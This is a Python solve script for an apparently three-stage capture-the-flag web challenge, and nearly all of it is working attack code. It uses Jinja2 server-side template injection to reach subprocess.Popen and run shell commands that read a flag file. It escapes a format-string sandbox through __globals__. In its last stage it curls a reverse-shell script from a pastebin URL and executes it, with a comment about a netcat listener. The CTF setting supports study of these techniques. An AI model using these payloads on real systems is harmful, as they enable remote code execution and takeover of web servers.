import requests
import re
import sys


def easy_solve(addr):
    # Get path to the easy task
    resp = requests.get(addr)
    question = resp.headers['X-GRYPHON']
    data = {'answer': question}
    resp = requests.post(addr + '/gryphon', data=data)
    path = re.search(r'/.*', resp.text).group()
    print(f"Easy task path: {path}")

    # Get subclasses list and search for Popen
    resp = requests.get(addr + path + '?name={{%277%27.__class__.__mro__[1].__subclasses__()}}')
    classes = re.search(r'\[.*\]', resp.text)
    classes = classes.group().split(',')
    for i, item in enumerate(classes):
        if 'Popen' in item:
            index = i
            break
    print(f"Found Popen subclass at id: {index}")

    # Send full payload and get medium task path
    solve = requests.get(addr + path + '?name={{%277%27.__class__.__mro__[1].__subclasses__()[' + str(index) + '](%27cat${IFS}flags/hey_its_me-the_flag%27,shell=True,stdout=-1).communicate()}}')
    flag = re.search(r'bit{.*}', solve.text).group()
    medium_path = re.search(r'(/.*)\\n', solve.text).group(1)
    print(flag)
    return medium_path, path, index

    # There is also easier solve mechanism as someone discovered - it is possible to call Popen from globals using for example this payload:
    # {{config.__class__.__init__.__globals__[%27os%27].popen(%27cat${IFS}flags/hey_its_me-the_flag%27).read()}}


def medium_solve(addr, path):
    # Send full payload
    print(f"Medium task path: {path}")
    solve = requests.get(addr + path + '?attack={{%22{0.__globals__[_mutable_sequence_types][1].insert.__globals__[sys].modules[__main__].FLAG}%22.format(range)}}')
    flag = re.search(r'bit{.*}', solve.text).group()
    print(flag)


def hard_solve(addr, path, index):
    # Upload a reverse shell (for local demonstration I'm uploading a one using pastebin, normally that would be hosted on some VPS)
    upload = requests.get(addr + path + '?name={{%277%27.__class__.__mro__[1].__subclasses__()[' + str(index) + '](%27curl${IFS}https://pastebin.com/raw/cCMnNbNQ${IFS}-o${IFS}rev_shell.py%27,shell=True,stdout=-1).communicate()}}')

    # Start reverse shell (remember to start netcat 'nc -lvp 8000' before to listen for connection)
    execute = requests.get(addr + path + '?name={{%277%27.__class__.__mro__[1].__subclasses__()[' + str(index) + '](%27python${IFS}rev_shell.py%27,shell=True,stdout=-1).communicate()}}')

if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f'{sys.argv[0]} [address]')
        sys.exit()

    addr = sys.argv[1]
    medium_path, easy_path, index = easy_solve(addr)
    medium_solve(addr, medium_path)
    hard_solve(addr, easy_path, index)